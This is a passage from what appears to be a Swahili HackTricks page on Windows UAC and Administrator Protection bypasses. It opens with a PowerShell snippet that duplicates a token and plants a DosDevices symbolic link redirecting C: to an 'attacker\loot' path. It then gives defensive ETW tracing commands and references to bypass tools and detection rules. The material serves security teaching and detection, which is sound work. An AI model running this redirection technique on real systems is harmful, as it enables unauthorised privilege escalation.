$p = Get-Process -Id $pid
$t = Get-NtToken -Process $p
$id = New-NtTokenDuplicate -Token $t -ImpersonationLevel Identification
Invoke-NtToken $id -ImpersonationLevel Identification { Get-NtDirectory "\??" | Out-Null }
$auth = Get-NtTokenId -Authentication -Token $id
New-NtSymbolicLink "\Sessions\0\DosDevices/$auth/C:" "\??\\C:\\Users\\attacker\\loot"
```
Kwenye hosts za preview, Administrator Protection hurekodi approvals na failures kama matukio ya ETW **15031** na **15032** chini ya provider wa `Microsoft-Windows-LUA`. Matukio hayo yanajumuisha SID ya requester, njia ya application, matokeo, akaunti ya administrator inayosimamiwa, na authentication method; hivyo majaribio ya exploit yanayorudiwa au kuendesha UI bila mafanikio si bila telemetry.<sup>[[10]](#references)</sup>
```cmd
logman start AdminProtectionTrace -p {93c05d69-51a3-485e-877f-1806a8731346} -ets
rem reproduce the elevation attempt
logman stop AdminProtectionTrace -ets
```
## References

- [1] [LOLBAS: Iscsicpl.exe](https://lolbas-project.github.io/lolbas/Binaries/Iscsicpl/)
- [2] [Microsoft Docs – Jinsi User Account Control inavyofanya kazi](https://learn.microsoft.com/windows/security/identity-protection/user-account-control/how-user-account-control-works)
- [3] [UACME – Mkusanyiko wa mbinu za UAC bypass](https://github.com/hfiref0x/UACME)
- [4] [WinPwnage – Kichanganuzi cha uoanifu na kizindua cha UAC bypass](https://github.com/rootm0s/WinPwnage)
- [5] [Checkpoint Research – KONNI Yatumia AI Kutengeneza PowerShell Backdoors](https://research.checkpoint.com/2026/konni-targets-developers-with-ai-malware/)
- [6] [Check Point Research – Operation TrueChaos: Unyonyaji wa 0-Day dhidi ya Malengo ya Serikali za Kusini-Mashariki mwa Asia](https://research.checkpoint.com/2026/operation-truechaos-0-day-exploitation-against-southeast-asian-government-targets/)
- [7] [Project Zero – Kupita Ulinzi wa Windows Administrator](https://projectzero.google/2026/26/windows-administrator-protection.html)
- [8] [Sigma / Detection.FYI – Kupita UAC kwa kutumia kazi ya SilentCleanup](https://detection.fyi/sigmahq/sigma/windows/registry/registry_set/registry_set_bypass_uac_using_silentcleanup_task/)
- [9] [R41N3RZUF477 – Mbinu za kupita UnifiedConsent, TabTip na Narrator Always Notify](https://github.com/hfiref0x/UACME/issues/173)
- [10] [Microsoft Learn – Ulinzi wa msimamizi](https://learn.microsoft.com/en-us/windows/security/application-security/application-control/administrator-protection/)
{{#include ../../banners/hacktricks-training.md}}
